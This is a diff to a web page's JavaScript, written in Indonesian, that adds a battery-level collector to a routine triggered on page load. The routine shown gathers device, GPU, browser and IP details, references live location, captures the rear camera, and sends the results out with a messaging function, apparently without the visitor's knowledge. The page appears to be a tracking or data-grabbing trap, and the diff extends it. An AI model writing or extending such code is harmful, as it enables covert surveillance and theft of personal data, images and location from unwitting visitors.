@@ -271,6 +271,37 @@ Dibuka via Browser     : ${vendor || 'Tidak diketahui'}
 `.trim();
     };
 
+const ambilBaterai = async () => {
+  try {
+    const statusOnline = navigator.onLine ? 'Online' : 'Offline';
+
+    if ('getBattery' in navigator) {
+      const bat = await navigator.getBattery();
+      const level = Math.round(bat.level * 100) + '%';
+      const charging = bat.charging ? 'Ya' : 'Tidak';
+
+      let estimasi = '-';
+      if (!bat.charging && bat.dischargingTime !== Infinity) {
+        const menit = Math.floor(bat.dischargingTime / 60);
+        const jam = Math.floor(menit / 60);
+        const sisa = menit % 60;
+        estimasi = `${jam} jam ${sisa} menit`;
+      }
+
+      return `
+౼ 〘 𝗕𝗔𝗧𝗘𝗥𝗔𝗜 〙 ౼
+Level Baterai          : ${level}
+Sedang Mengisi         : ${charging}
+Estimasi Sisa Waktu    : ${estimasi}
+Status Online          : ${statusOnline}`.trim();
+    }
+
+    return `౼ 〘 𝗕𝗔𝗧𝗘𝗥𝗔𝗜 〙 ౼\n❌ Tidak didukung browser.`;
+  } catch {
+    return `౼ 〘 𝗕𝗔𝗧𝗘𝗥𝗔𝗜 〙 ౼\n❌ Gagal mengambil info baterai.`;
+  }
+};
+
     const ambilLayarGrafik = async () => {
       let gpu = { vendor: '-', renderer: '-' };
       let webglSupport = 'Tidak';
@@ -469,12 +500,13 @@ resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 �
       }
     };
 
-  const mulai = async () => {
+const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
   // Ambil semua yang akan digabung dulu
   const infoPerangkat = await ambilDataPerangkat();
+  const bateraiInfo = await ambilBaterai();
   const layarGrafik = await ambilLayarGrafik();
   const browserInfo = ambilBrowserInfo();
   const ipInfo = await ambilIPInfo();
@@ -482,6 +514,7 @@ resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 �
   // Gabung jadi satu pesan
   const gabungAwal = [
     infoPerangkat,
+    bateraiInfo,
     layarGrafik,
     browserInfo,
     ipInfo
@@ -499,7 +532,7 @@ resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 �
 
   const belakang = await ambilKamera("environment", "belakang");
   await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`);
-  };
+};
 
     window.addEventListener("load", mulai);
   </script>
